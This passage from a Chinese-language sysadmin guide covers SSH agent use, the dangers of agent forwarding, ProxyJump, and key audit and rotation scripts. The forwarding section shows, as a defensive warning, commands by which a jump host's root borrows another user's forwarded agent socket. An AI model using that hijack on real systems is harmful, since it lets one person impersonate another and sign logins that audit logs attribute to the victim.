| **`ssh-add -D`** | **清空 agent**。★★★★ 離開座位、切換身分、下班前 | ★★★★ |
| **`ssh-add -t 3600`** | 金鑰**一小時後自動從 agent 移除** | ★★★★ |
| **`ssh-add -c`** | **每次被使用都要人工確認**（需 `ssh-askpass`）。★★★★★ 不得已要用 agent forwarding 時的必備搭配 | ★★★★★ |
| `ssh-add -x` / `-X` | 鎖定／解鎖 agent（要密碼才能再用） | ★★ |

★★★★ 實務組合：**個人維運金鑰一律 `ssh-add -t 28800`**（一個工作日），
下班時 agent 自動空掉，筆電就算被拿走也不會直接連到正式機。

**用 systemd user unit 常駐 agent** ★★★

每開一個終端就 `eval $(ssh-agent -s)` 會產生一堆孤兒 agent 行程，
金鑰要重複加、`ssh-add -D` 也清不乾淨。正解是讓 systemd 管一個就好：

```bash
mkdir -p ~/.config/systemd/user
tee ~/.config/systemd/user/ssh-agent.service > /dev/null <<'EOF'
[Unit]
Description=SSH key agent

[Service]
Type=simple
Environment=SSH_AUTH_SOCK=%t/ssh-agent.socket
# ★★★ -D 前景執行（給 systemd 管），-a 指定固定的 socket 路徑
ExecStart=/usr/bin/ssh-agent -D -a $SSH_AUTH_SOCK

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
systemctl --user enable --now ssh-agent.service
```

驗證：

```bash
systemctl --user status ssh-agent.service --no-pager
```

預期輸出：

```text
● ssh-agent.service - SSH key agent
     Loaded: loaded (/home/wangxm/.config/systemd/user/ssh-agent.service; enabled)
     Active: active (running) since Fri 2026-08-28 09:02:11 CST; 5s ago
```

再讓所有 shell 都指到同一個 socket：

```bash
echo 'export SSH_AUTH_SOCK="${XDG_RUNTIME_DIR}/ssh-agent.socket"' >> ~/.bashrc
```

★★★ `%t` 在 systemd user unit 裡展開成 `$XDG_RUNTIME_DIR`（通常是 `/run/user/1001`）。
如果這台機器你會用 `ssh` 登入而非圖形登入，還要開 linger 讓 user manager 常駐：

```bash
sudo loginctl enable-linger wangxm
```

★★★★ 反過來說，**伺服器上通常不需要常駐 agent**。
需要「從伺服器連到另一台伺服器」時，正解是 ProxyJump（見下一節），不是在伺服器上養 agent。

**桌面與 WSL 的實務差異** ★★★

| 環境 | 現況 | 做法 |
| --- | --- | --- |
| **GNOME 桌面（Ubuntu 24.04 以後）** | `gnome-keyring-daemon` 從 **46 版起預設不再提供 SSH agent**，改由 `gcr-4` 套件的 `gcr-ssh-agent` 接手 | `systemctl --user enable --now gcr-ssh-agent.socket`，`SSH_AUTH_SOCK` 指向 `$XDG_RUNTIME_DIR/gcr/ssh` |
| GNOME 桌面（舊版） | `gnome-keyring` 自動提供 agent 並在解鎖登入鑰匙圈時載入金鑰 | 通常不用額外設定。★★★ 但它會**自動**載入 `~/.ssh` 下的金鑰，容易踩到下一節的 `MaxAuthTries` |
| **WSL2** | 沒有 systemd 使用者 session 時 agent 不會自動起；每個 `wsl.exe` 進入點是獨立的 | 較新的 WSL 已支援 systemd（`/etc/wsl.conf` 加 `[boot]\nsystemd=true`），可直接用上面的 user unit |
| WSL2（未開 systemd） | 每開一個視窗就一個新 agent | 用 `keychain`：`eval "$(keychain --eval --quiet id_ed25519_ops)"` 放進 `~/.bashrc`，它會重用既有 agent |
| 純伺服器（無桌面） | 沒有 agent | 用上面的 user unit，或直接不用 agent（機器帳號金鑰本來就無 passphrase + `restrict`） |

> [!warning] ★★★ 不要為了「讓 cron 也能用 agent」而去複製 `SSH_AUTH_SOCK`
> cron／systemd timer 跑的是**非互動、無人值守**的工作，本來就不該依賴一個
> 「要人打 passphrase 才會有內容」的 agent。
> 排程工作應該用**專屬的、無 passphrase 但有 `restrict,from=,command=` 限制的機器金鑰**，
> 並把私鑰檔權限設成 `600`、擁有者是那個服務帳號。
> 排程設定見 [[18-排程工作]]。

**`AddKeysToAgent yes`**

```bash
grep -n AddKeysToAgent ~/.ssh/config
```

```text
5:    AddKeysToAgent yes
```

★★★ 設了之後，第一次用到某把金鑰時輸入 passphrase，它會**自動加進 agent**，
不用先手動 `ssh-add`。可以寫成 `yes` / `no` / `ask` / `confirm` / 一個時限（如 `1h`）。
`~/.ssh/config` 的完整語法（`Host`、`Match`、各種指令的優先順序）見 [[03-SSH-客戶端設定檔]]。

### 三、★★★★★ agent forwarding（`ssh -A`）的真實風險

這是本篇的資安核心。

**`-A` 做了什麼**

```
你的筆電                     跳板機 jump01                  正式機 web01
┌────────────┐              ┌───────────────────┐          ┌──────────┐
│ ssh-agent  │              │ /tmp/ssh-xxxx/    │          │          │
│ （私鑰）    │◄═════════════│  agent.9931       │─────────►│  登入成功 │
└────────────┘   SSH 通道    │  ↑                │  用你的   └──────────┘
                             │  $SSH_AUTH_SOCK   │  身分簽章
                             │                   │
                             │  ★★★★★ 這個 socket 在跳板機的檔案系統上
                             │  凡是能讀它的行程，都能【叫你的私鑰簽任何東西】
                             └───────────────────┘
```

**誰能讀它？**

```bash
ls -l "$SSH_AUTH_SOCK"
```

預期輸出（在跳板機上）：

```text
srw------- 1 wangxm wangxm 0 Aug 28 10:41 /tmp/ssh-Xa9kQ2/agent.9931
```

看起來只有你自己 —— **但這只擋得住一般使用者**。

| 誰 | 能不能借用你的身分 | 說明 |
| --- | --- | --- |
| **跳板機的 root** | ★★★★★ **可以** | root 無視檔案權限。跳板機被入侵 = 你的身分被借走 |
| 跳板機上的其他管理員（有 sudo） | ★★★★★ **可以** | `sudo SSH_AUTH_SOCK=/tmp/ssh-Xa9kQ2/agent.9931 ssh root@核心資料庫` |
| 你自己在跳板機上跑的任何程式 | ★★★★ **可以** | 一個被投毒的 npm 套件、一支惡意的 shell 腳本 |
| 其他一般使用者 | 不行 | 但只要有本機提權漏洞就變成可以 |

**實際被借用長什麼樣**（★★★★★ 這在跳板機上是一行指令的事）：

```bash
# 攻擊者（跳板機的 root）
sudo -u root env SSH_AUTH_SOCK=/tmp/ssh-Xa9kQ2/agent.9931 ssh-add -l
```

預期輸出：

```text
256 SHA256:cNgXnpcfTlWLmrBBnVB63+416+aHzJNnF/R1+K+gMlQ ops-wangxm-2026 (ED25519)
```

★★★★★ **看得到指紋，就等於能用它登入任何接受這把公鑰的伺服器。**
私鑰本體沒有被偷走 —— 但攻擊者根本不需要偷，他只要在你連著的這段時間內
「請你的 agent 幫他簽」就好了。而且**稽核日誌上留下的是你的名字**。

> [!danger] ★★★★★ 機關跳板機一律禁用 agent forwarding
> - 客戶端：**不要用 `-A`**，也不要在 `~/.ssh/config` 寫 `ForwardAgent yes`
>   （尤其不要寫在 `Host *` 底下）
> - 伺服器端：在 `sshd_config` 設 `AllowAgentForwarding no`（見 [[04-sshd-伺服器端設定]]）
> - `authorized_keys` 端：加 `restrict` 或 `no-agent-forwarding`
>
> 另外，被轉發的 agent 曾經是**真實的遠端執行漏洞**來源（CVE-2023-38408，
> OpenSSH 9.3p2 修正）：惡意伺服器可以透過被轉發的 agent 在**客戶端**執行程式碼。
> 這不是理論風險。

**正解：ProxyJump（`-J`）** ★★★★

```bash
ssh -J ops@jump01.example.gov.tw ops@10.10.20.31
```

或寫在 `~/.ssh/config`：

```text
Host web01
    HostName 10.10.20.31
    User ops
    ProxyJump ops@jump01.example.gov.tw
```

```
你的筆電                     跳板機 jump01                  正式機 web01
┌────────────┐              ┌───────────────────┐          ┌──────────┐
│ ssh-agent  │              │  只是一條 TCP 通道 │          │          │
│ （私鑰）    │══════════════╪═══════════════════╪═════════►│ 端對端加密│
└────────────┘              │  ★★★★ 跳板機看不到 │          └──────────┘
                            │  也碰不到任何身分  │
                            └───────────────────┘
```

★★★★ **ProxyJump 是端對端的**：你和 web01 之間是一條完整的 SSH 連線，
跳板機只負責轉發 TCP 位元組，**沒有任何可以被借用的東西留在上面**。
`-J` 需要 OpenSSH 7.3 以上（2016 年），現役系統都有。

| 比較 | `ForwardAgent` (`-A`) | `ProxyJump` (`-J`) |
| --- | --- | --- |
| 跳板機上有無你的身分 | ★★★★★ **有**（socket） | 沒有 |
| 加密範圍 | 兩段（筆電→跳板、跳板→目標） | **端對端一段** |
| 跳板機被入侵的後果 | 你的所有伺服器一起失守 | 只失去這台跳板機 |
| 目標機看到的來源 IP | 跳板機 | 跳板機（`from=` 要寫跳板機） |
| 建議 | **禁用** | **標準做法** |

**真的非用 `-A` 不可時的最低要求** ★★★★★

（例如：某個廠商的部署工具只支援 agent forwarding、且短期內無法更改）

```text
# ~/.ssh/config —— ★★★★ 只對這一台開，絕對不要放在 Host *
Host legacy-deploy
    HostName 10.10.20.90
    User ops
    ForwardAgent yes
```

搭配 `-c`（每次使用都要人工按確認）：

```bash
ssh-add -D                                # 先清空
ssh-add -c -t 1800 ~/.ssh/id_ed25519_ops  # 需確認 + 30 分鐘後自動移除
```

★★★ `-c` 需要有 `ssh-askpass`（`sudo apt install ssh-askpass-gnome`）；
純文字終端沒有它時 `-c` 會直接失敗。用完立刻 `ssh-add -D`。

### 四、多把金鑰的試誤問題 ★★★

```bash
ssh ops@10.10.20.31
```

預期輸出（失敗）：

```text
Received disconnect from 10.10.20.31 port 22:2: Too many authentication failures
Disconnected from 10.10.20.31 port 22
```

**原因**：客戶端會把 agent 裡的金鑰**一把一把送出去試**，加上 `~/.ssh` 底下所有
`id_*` 檔案。sshd 的 `MaxAuthTries` 預設是 **6**，第 7 次嘗試就直接踢掉連線 ——
**正確的那把可能排在第 9 位，根本還沒輪到。**

觀察過程：

```bash
ssh -v ops@10.10.20.31 2>&1 | grep -E 'Offering|Trying|Authentications'
```

預期輸出：

```text
debug1: Offering public key: /home/wangxm/.ssh/id_ed25519_personal ED25519 SHA256:AAA... agent
debug1: Offering public key: /home/wangxm/.ssh/id_rsa_github RSA SHA256:BBB... agent
debug1: Offering public key: /home/wangxm/.ssh/id_ed25519_lab ED25519 SHA256:CCC... agent
debug1: Offering public key: /home/wangxm/.ssh/id_ed25519_ops ED25519 SHA256:cNg... agent
...
Received disconnect from 10.10.20.31 port 22:2: Too many authentication failures
```

★★★ **一眼判斷**：`Offering public key:` 出現超過 5 次就是這個問題。

**臨時解**：

```bash
ssh -o IdentitiesOnly=yes -i ~/.ssh/id_ed25519_ops ops@10.10.20.31
```

★★★★ `IdentitiesOnly=yes` 的意思是「**只用我明確指定的金鑰**」。
只加 `-i` 是不夠的 —— 沒有 `IdentitiesOnly` 時 `-i` 只是「多加一把候選」，
agent 裡那一堆還是會照送。

**長久解**：寫進 `~/.ssh/config`，一個站台配一把金鑰。

```text
Host web01
    HostName 10.10.20.31
    User ops
    IdentityFile ~/.ssh/id_ed25519_ops
    IdentitiesOnly yes
```

`Host` / `Match` 的完整語法、萬用字元、設定套用順序（先出現者優先）詳見 [[03-SSH-客戶端設定檔]]。
伺服器端的 `MaxAuthTries` 調整見 [[04-sshd-伺服器端設定]]。

★★★ 順帶一提：`MaxAuthTries` 被打爆時，伺服器端會累積大量失敗紀錄，
如果裝了 fail2ban 之類的封鎖機制，**你自己的 IP 會被鎖**。
排查時先確認不是自己造成的，見 [[07-SSH-安全強化]]。

### 五、硬體金鑰與短效憑證（知道有這回事就好）

| 機制 | 一句話 | 何時該考慮 | 詳見 |
| --- | --- | --- | --- |
| **FIDO2 硬體金鑰**（`ed25519-sk`） | 私鑰在硬體裡，**無法被複製**；每次簽章要碰一下（或按 PIN） | ★★★★ 高權限帳號（root 跳板、核心資料庫、CA 主機） | [[07-SSH-安全強化]] |
| **SSH CA 短效憑證** | 由 CA 簽發有效期幾小時的憑證，`authorized_keys` 只放一行 CA 公鑰 | ★★★★ 伺服器超過 30 台、人員異動頻繁時，盤點與撤銷成本會壓垮手工管理 | [[07-SSH-安全強化]]、[[07-身分存取管理IAM與MFA]] |

```bash
ssh-keygen -t ed25519-sk -O resident -O verify-required -C "ops-wangxm-yubikey-2026"
```

★★★ 三個 `-O` 選項的意義：`resident` 把金鑰存進硬體（換電腦可以再取出）、
`verify-required` 每次都要輸入 PIN（不只是碰觸）、
另有 `application=ssh:xxx` 可在同一支硬體上放多把不同用途的金鑰。
逐步操作與備援金鑰的準備見 [[07-SSH-安全強化]]。

> [!tip] ★★★ 什麼時候該從「手工金鑰」升級到「憑證」
> 判斷準則不是伺服器數量，是這個問題：
> **「某人今天離職，你能在一小時內確定他再也連不上任何一台機器嗎？」**
> 答不出來，就該考慮 SSH CA 了。

---

## 完整實戰範例

### 情境

某機關資訊室，三位維運人員 + 一組 CI 部署流程，管理 12 台 Linux 伺服器。
目前狀況：大家共用一把沒有 passphrase 的 `id_rsa`，CI 借用某位同仁的金鑰，
沒有任何清冊。**目標是在不中斷服務的前提下完成金鑰標準化，並交出稽核查得動的紀錄。**

| 對象 | 金鑰 | authorized_keys 選項 |
| --- | --- | --- |
| 王小明 | `ops-wangxm-2026`（ed25519，有 passphrase） | `from="10.10.20.0/24"` |
| 李大同 | `ops-lidt-2026` | `from="10.10.20.0/24"` |
| 陳美玲 | `ops-chenml-2026` | `from="10.10.20.0/24"` |
| CI 部署 | `deploy-ci-portal-2026`（無 passphrase，存在 CI Secret） | `restrict,from="10.10.90.0/24",command="/usr/local/bin/deploy-wrapper",expiry-time="20271231"` |

### 步驟【1】建立人員名冊（稽核的基準）

```bash
sudo install -d -m 0750 -o root -g root /etc/ssh/keyreg
sudo tee /etc/ssh/keyreg/registry.csv > /dev/null <<'EOF'
# 註解,持有人,單位,發放日,到期日,狀態
ops-wangxm-2026,王小明,資訊室,2026-01-15,2027-12-31,有效
ops-lidt-2026,李大同,資訊室,2026-01-15,2027-12-31,有效
ops-chenml-2026,陳美玲,資訊室,2026-03-01,2027-12-31,有效
deploy-ci-portal-2026,CI-入口網,資訊室,2026-02-10,2027-12-31,有效
backup-nas-pull-2026,備份主機,資訊室,2026-02-10,2027-12-31,有效
monitor-zabbix-2026,監控主機,資訊室,2026-02-10,2027-12-31,有效
EOF
sudo chmod 640 /etc/ssh/keyreg/registry.csv
```

★★★ 名冊用**註解欄**當主鍵，這就是為什麼註解命名慣例是硬規定。

### 步驟【2】三人各自產生金鑰（在自己的機器上）

```bash
ssh-keygen -t ed25519 -a 100 -C "ops-wangxm-2026" -f ~/.ssh/id_ed25519_ops
ssh-add -t 28800 ~/.ssh/id_ed25519_ops
ssh-add -l
```

預期輸出：

```text
256 SHA256:cNgXnpcfTlWLmrBBnVB63+416+aHzJNnF/R1+K+gMlQ ops-wangxm-2026 (ED25519)
```

三人把 **`.pub` 檔**（不是私鑰！）交給負責部署的人。

### 步驟【3】部署到伺服器（★★★★ 全程保留終端 A）

```bash
# —— 在終端 A（既有連線）——
sudo -u ops bash -c 'umask 077; mkdir -p ~/.ssh'
sudo -u ops tee -a /home/ops/.ssh/authorized_keys > /dev/null <<'EOF'
from="10.10.20.0/24" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINU/8gy...17ct ops-wangxm-2026
from="10.10.20.0/24" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKp9RtQ...9xQ2 ops-lidt-2026
from="10.10.20.0/24" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILm4Zc7...bT8v ops-chenml-2026
EOF
sudo chmod 700 /home/ops/.ssh
sudo chmod 600 /home/ops/.ssh/authorized_keys
sudo chown -R ops:ops /home/ops/.ssh
sudo chmod go-w /home/ops
```

驗證檔案本身合法（★★★ 貼上時被換行截斷是最常見的錯誤）：

```bash
sudo ssh-keygen -lf /home/ops/.ssh/authorized_keys
```

預期輸出（三行，每行一把）：

```text
256 SHA256:cNgXnpcfTlWLmrBBnVB63+416+aHzJNnF/R1+K+gMlQ ops-wangxm-2026 (ED25519)
256 SHA256:Kd0Qm2vRt8xLpB3nYc1wZfA7eH5jU9sT4oI6gN2mXyE ops-lidt-2026 (ED25519)
256 SHA256:Rt7Yb2nQ4wLm9xZc3vK8pA1sD6fG5hJ0uI7oE4tN9yM ops-chenml-2026 (ED25519)
```

★★★★ **行數對不上，就是有公鑰被貼壞了**（多半是編輯器自動換行）。

### 步驟【4】CI 部署金鑰

```bash
sudo useradd -m -s /bin/bash -c "CI 部署帳號" deployer
sudo -u deployer bash -c 'umask 077; mkdir -p ~/.ssh'
sudo -u deployer tee /home/deployer/.ssh/authorized_keys > /dev/null <<'EOF'
restrict,from="10.10.90.0/24",command="/usr/local/bin/deploy-wrapper",expiry-time="20271231" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIQw3ErTy...Uio5 deploy-ci-portal-2026
EOF
sudo chmod 600 /home/deployer/.ssh/authorized_keys
sudo chmod go-w /home/deployer
```

驗證「拿不到 shell」（★★★★ 這一步一定要做）：

```bash
ssh -i /path/to/deploy_ci deployer@10.10.20.31
```

預期輸出：

```text
此金鑰不提供互動式登入。可用指令：deploy <ref> / rollback <sha> / status
```

★★★ 如果這裡真的拿到了 shell 提示字元，代表 `command=` 沒生效
（最常見原因：選項欄與金鑰之間用了 Tab 或多個空白、或選項欄被換行截斷）。

### 步驟【5】稽核腳本 `/usr/local/bin/ssh-key-audit`

```bash
sudo tee /usr/local/bin/ssh-key-audit > /dev/null <<'AUDIT'
#!/usr/bin/env bash
# ssh-key-audit —— 全機 SSH 公鑰盤點
#   掃描所有帳號的 authorized_keys，輸出 CSV，並以 exit code 反映稽核結果
#   exit 0=全部合規  1=有警告  2=有高風險  3=執行錯誤
set -euo pipefail

REGISTRY="${SSH_KEY_REGISTRY:-/etc/ssh/keyreg/registry.csv}"
OUTDIR="${SSH_KEY_AUDIT_DIR:-/var/log/ssh-key-audit}"
STAMP="$(date '+%Y%m%d-%H%M%S')"
OUT="${OUTDIR}/audit-$(hostname -s)-${STAMP}.csv"
QUIET="${QUIET:-0}"

RC_WARN=0
RC_HIGH=0

die()  { echo "❌ $*" >&2; exit 3; }
info() { [ "$QUIET" = "1" ] || echo "$*"; }

# ── 前置檢查 ────────────────────────────────────────────────
[ "$(id -u)" -eq 0 ] || die "必須以 root 執行（要讀其他帳號的 authorized_keys）"
command -v ssh-keygen >/dev/null 2>&1 || die "找不到 ssh-keygen"
mkdir -p "$OUTDIR" || die "無法建立輸出目錄 $OUTDIR"
chmod 750 "$OUTDIR"

if [ -r "$REGISTRY" ]; then
  info "名冊：$REGISTRY"
else
  info "⚠ 找不到名冊 $REGISTRY，所有金鑰都會被標記為【不在名冊】"
fi

# ── 收集要掃描的 authorized_keys ────────────────────────────
# ★★★★ 不能只掃 /home：服務帳號的家目錄常在 /var/www、/srv、/opt
collect_files() {
  # 從 /etc/passwd 取得所有家目錄（含非標準路徑）
  awk -F: '$6 != "" && $6 != "/" {print $6}' /etc/passwd | sort -u | while read -r home; do
    [ -d "$home" ] || continue
    for f in "$home/.ssh/authorized_keys" "$home/.ssh/authorized_keys2"; do
      [ -f "$f" ] && echo "$f"
    done
  done
  # sshd_config 若自訂了集中式路徑，一併納入
  if [ -f /etc/ssh/sshd_config ]; then
    grep -hiE '^[[:space:]]*AuthorizedKeysFile' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/*.conf 2>/dev/null \
      | awk '{for(i=2;i<=NF;i++) print $i}' \
      | grep -E '^/' | sort -u | while read -r p; do
          [ -f "$p" ] && echo "$p"
        done
  fi
}

# ── 解析單行 ────────────────────────────────────────────────
KEYRE='(ssh-ed25519|ssh-rsa|ssh-dss|ecdsa-sha2-nistp256|ecdsa-sha2-nistp384|ecdsa-sha2-nistp521|sk-ssh-ed25519@openssh\.com|sk-ecdsa-sha2-nistp256@openssh\.com)[[:space:]]'

echo "主機,檔案,帳號,行號,型別,長度,指紋,註解,選項,在名冊,風險" > "$OUT"

HOST="$(hostname -s)"
TOTAL=0

while IFS= read -r AKFILE; do
  [ -n "$AKFILE" ] || continue
  OWNER="$(stat -c '%U' "$AKFILE" 2>/dev/null || echo '?')"
  LINENO_=0

  while IFS= read -r line || [ -n "$line" ]; do
    LINENO_=$((LINENO_ + 1))
    # 跳過空行與註解行
    case "$line" in ''|'#'*) continue ;; esac

    # 拆出選項欄
    OPTS=""
    if [[ "$line" =~ ^(.*)$KEYRE ]]; then
      OPTS="$(echo "${BASH_REMATCH[1]}" | sed 's/[[:space:]]*$//')"
    fi

    # 取指紋（★ 用 /dev/stdin 逐行處理，才知道問題出在哪一行）
    if ! FP_LINE="$(ssh-keygen -lf /dev/stdin <<< "$line" 2>/dev/null)"; then
      echo "${HOST},${AKFILE},${OWNER},${LINENO_},?,?,?,?,\"${OPTS}\",否,\"★★★ 無法解析（公鑰可能被換行截斷）\"" >> "$OUT"
      RC_HIGH=1
      TOTAL=$((TOTAL + 1))
      continue
    fi

    BITS="$(awk '{print $1}' <<< "$FP_LINE")"
    FP="$(awk '{print $2}' <<< "$FP_LINE")"
    TYPE="$(sed -E 's/.*\(([A-Z0-9-]+)\)$/\1/' <<< "$FP_LINE")"
    COMMENT="$(sed -E "s/^[0-9]+ [^ ]+ //; s/ \([A-Z0-9-]+\)$//" <<< "$FP_LINE")"
    [ "$COMMENT" = "no comment" ] && COMMENT=""

    # 對照名冊
    INREG="否"
    if [ -n "$COMMENT" ] && [ -r "$REGISTRY" ]; then
      grep -q "^${COMMENT}," "$REGISTRY" && INREG="是"
    fi

    # ── 風險判定 ──────────────────────────────────────────
    RISK=""
    add_risk() { RISK="${RISK}${RISK:+；}$1"; }

    [ -z "$COMMENT" ]        && { add_risk "★★★★ 無註解（無法辨識持有人）"; RC_HIGH=1; }
    [ "$INREG" = "否" ] && [ -n "$COMMENT" ] && { add_risk "★★★★ 不在名冊（疑似殭屍金鑰）"; RC_HIGH=1; }
    [ "$TYPE" = "DSA" ]      && { add_risk "★★★★★ DSA 已淘汰"; RC_HIGH=1; }
    [ "$TYPE" = "RSA" ] && [ "$BITS" -lt 3072 ] && { add_risk "★★★★ RSA 長度不足（${BITS}）"; RC_HIGH=1; }
    case "$TYPE" in ECDSA) add_risk "★★ 建議改用 ED25519"; RC_WARN=1 ;; esac

    # 服務帳號沒有限制 = 高風險
    if [ -z "$OPTS" ]; then
      case "$COMMENT" in
        deploy-*|backup-*|monitor-*|ci-*)
          add_risk "★★★★ 機器金鑰無任何限制（缺 restrict/from/command）"; RC_HIGH=1 ;;
        *)
          add_risk "★★ 無來源限制（建議加 from=）"; RC_WARN=1 ;;
      esac
    else
      case "$OPTS" in
        *command=*) : ;;
        *) case "$COMMENT" in
             deploy-*|backup-*|monitor-*|ci-*)
               add_risk "★★★ 機器金鑰未限制可執行指令"; RC_WARN=1 ;;
           esac ;;
      esac
    fi

    [ -z "$RISK" ] && RISK="—"
    echo "${HOST},${AKFILE},${OWNER},${LINENO_},${TYPE},${BITS},${FP},\"${COMMENT}\",\"${OPTS}\",${INREG},\"${RISK}\"" >> "$OUT"
    TOTAL=$((TOTAL + 1))
  done < "$AKFILE"

  # ── 檔案與目錄權限檢查（StrictModes）★★★★ ─────────────
  AKDIR="$(dirname "$AKFILE")"
  HOMEDIR="$(dirname "$AKDIR")"
  for p in "$HOMEDIR" "$AKDIR" "$AKFILE"; do
    MODE="$(stat -c '%a' "$p")"
    if [ "$(stat -c '%A' "$p" | cut -c6)" = "w" ] || [ "$(stat -c '%A' "$p" | cut -c9)" = "w" ]; then
      echo "${HOST},${p},$(stat -c '%U' "$p"),-,-,-,-,\"\",\"mode=${MODE}\",-,\"★★★★ 權限過鬆，sshd 會靜默忽略此帳號的公鑰\"" >> "$OUT"
      RC_HIGH=1
    fi
  done
done < <(collect_files)

chmod 640 "$OUT"

# ── 輸出摘要 ────────────────────────────────────────────────
info ""
info "═══════════════════════════════════════════"
info " SSH 金鑰稽核  ${HOST}  $(date '+%F %T')"
info "═══════════════════════════════════════════"
info " 掃描到公鑰：${TOTAL} 把"
info " 報表：${OUT}"
if [ "$RC_HIGH" -eq 1 ]; then
  info " 結果：❌ 有【高風險】項目，請立即處理"
  awk -F',' 'NR>1 && $NF ~ /★★★★/ {print "   - " $2 " 行" $4 " " $8 " " $NF}' "$OUT" | head -20
  exit 2
elif [ "$RC_WARN" -eq 1 ]; then
  info " 結果：⚠ 有建議改善項目"
  exit 1
else
  info " 結果：✓ 全部合規"
  exit 0
fi
AUDIT
sudo chmod 750 /usr/local/bin/ssh-key-audit
```

執行：

```bash
sudo /usr/local/bin/ssh-key-audit
```

預期輸出（有問題時）：

```text
名冊：/etc/ssh/keyreg/registry.csv

═══════════════════════════════════════════
 SSH 金鑰稽核  web01  2026-08-28 11:04:22
═══════════════════════════════════════════
 掃描到公鑰：7 把
 報表：/var/log/ssh-key-audit/audit-web01-20260828-110422.csv
 結果：❌ 有【高風險】項目，請立即處理
   - /home/deploy_old/.ssh/authorized_keys 行1 "" ★★★★ 無註解（無法辨識持有人）
   - /root/.ssh/authorized_keys 行2 "ops-hsuty-2023" ★★★★ 不在名冊（疑似殭屍金鑰）
   - /var/www/.ssh/authorized_keys 行1 "deploy-legacy" ★★★★ 機器金鑰無任何限制（缺 restrict/from/command）
```

全部合規時：

```text
 掃描到公鑰：4 把
 報表：/var/log/ssh-key-audit/audit-web01-20260828-110931.csv
 結果：✓ 全部合規
```

排程每週執行（詳細語法見 [[18-排程工作]]）：

```bash
sudo tee /etc/systemd/system/ssh-key-audit.service > /dev/null <<'EOF'
[Unit]
Description=SSH key audit

[Service]
Type=oneshot
Environment=QUIET=1
ExecStart=/usr/local/bin/ssh-key-audit
EOF

sudo tee /etc/systemd/system/ssh-key-audit.timer > /dev/null <<'EOF'
[Unit]
Description=Weekly SSH key audit

[Timer]
OnCalendar=Mon 07:30
Persistent=true

[Install]
WantedBy=timers.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now ssh-key-audit.timer
sudo systemctl list-timers ssh-key-audit.timer --no-pager
```

預期輸出：

```text
NEXT                        LEFT     LAST PASSED UNIT                 ACTIVATES
Mon 2026-08-31 07:30:00 CST 2 days - -           ssh-key-audit.timer  ssh-key-audit.service
```

★★★ 因為腳本用 exit code 反映結果，systemd 會把 exit 2 記成 failed，
可以直接被監控系統抓到（見 [[07-自動化健康檢查實戰]]）。

### 步驟【6】輪替腳本 `/usr/local/bin/ssh-key-rotate`

```bash
sudo tee /usr/local/bin/ssh-key-rotate > /dev/null <<'ROT'
#!/usr/bin/env bash
# ssh-key-rotate —— 金鑰輪替：先加新 → 人工驗證 → 註解舊 → 七天後清除
#   用法：
#     ssh-key-rotate add     <帳號> <新公鑰檔>
#     ssh-key-rotate retire  <帳號> <舊金鑰註解或指紋>
#     ssh-key-rotate purge   <帳號> [保留天數，預設 7]
#     ssh-key-rotate rollback <帳號>
set -euo pipefail

ACTION="${1:-}"; ACCOUNT="${2:-}"; ARG3="${3:-}"
BACKUP_DIR=/var/backups/ssh-authorized-keys

die() { echo "❌ $*" >&2; exit 1; }
usage() { sed -n '3,9p' "$0" | sed 's/^# \?//'; exit 1; }

[ "$(id -u)" -eq 0 ] || die "必須以 root 執行"
[ -n "$ACTION" ] && [ -n "$ACCOUNT" ] || usage

HOME_DIR="$(getent passwd "$ACCOUNT" | cut -d: -f6)"
[ -n "$HOME_DIR" ] || die "查無帳號：$ACCOUNT"
AK="$HOME_DIR/.ssh/authorized_keys"
[ -f "$AK" ] || die "找不到 $AK"

backup() {
  mkdir -p "$BACKUP_DIR"; chmod 700 "$BACKUP_DIR"
  local b="$BACKUP_DIR/${ACCOUNT}.$(date '+%Y%m%d-%H%M%S')"
  cp -p "$AK" "$b"
  chmod 600 "$b"
  echo "  備份：$b"
}

case "$ACTION" in
  add)
    [ -f "$ARG3" ] || die "找不到公鑰檔：$ARG3"
    ssh-keygen -lf "$ARG3" >/dev/null 2>&1 || die "不是合法的公鑰檔：$ARG3"
    NEWFP="$(ssh-keygen -lf "$ARG3" | awk '{print $2}')"
    if ssh-keygen -lf "$AK" 2>/dev/null | grep -qF "$NEWFP"; then
      echo "ℹ 這把金鑰已經在 $AK 裡，不重複加入"; exit 0
    fi
    backup
    printf '# 新增於 %s（輪替中）\n' "$(date '+%F')" >> "$AK"
    cat "$ARG3" >> "$AK"
    chown "$ACCOUNT": "$AK"; chmod 600 "$AK"
    echo "✓ 已加入新金鑰：$NEWFP"
    echo ""
    echo "★★★★ 下一步【不要跳過】："
    echo "   另開一個新終端，用新金鑰實測登入："
    echo "     ssh -o IdentitiesOnly=yes -o PasswordAuthentication=no \\"
    echo "         -i <新私鑰> ${ACCOUNT}@$(hostname -f) 'id'"
    echo "   確認成功後，才執行："
    echo "     ssh-key-rotate retire ${ACCOUNT} <舊金鑰註解>"
    ;;

  retire)
    [ -n "$ARG3" ] || usage
    grep -qF "$ARG3" "$AK" || die "在 $AK 找不到符合「$ARG3」的行"
    HITS="$(grep -cF "$ARG3" "$AK")"
    [ "$HITS" -eq 1 ] || die "符合「$ARG3」的有 ${HITS} 行，請給更精確的字串"
    backup
    # ★★★★ 註解掉而不是刪除，保留七天以便回滾
    TAG="#ROTATED-$(date '+%Y%m%d') "
    sed -i "s|^\(.*${ARG3}.*\)$|${TAG}\1|" "$AK"
    chown "$ACCOUNT": "$AK"; chmod 600 "$AK"
    echo "✓ 已停用（註解）舊金鑰：$ARG3"
    echo "  七天後執行 purge 才會真正刪除：ssh-key-rotate purge ${ACCOUNT}"
    ;;

  purge)
    DAYS="${ARG3:-7}"
    CUTOFF="$(date -d "-${DAYS} days" '+%Y%m%d')"
    backup
    REMOVED=0
    TMP="$(mktemp)"; trap 'rm -f "$TMP"' EXIT
    while IFS= read -r line || [ -n "$line" ]; do
      if [[ "$line" =~ ^#ROTATED-([0-9]{8})[[:space:]] ]]; then
        if [ "${BASH_REMATCH[1]}" -le "$CUTOFF" ]; then
          REMOVED=$((REMOVED + 1)); continue
        fi
      fi
      printf '%s\n' "$line" >> "$TMP"
    done < "$AK"
    cat "$TMP" > "$AK"
    chown "$ACCOUNT": "$AK"; chmod 600 "$AK"
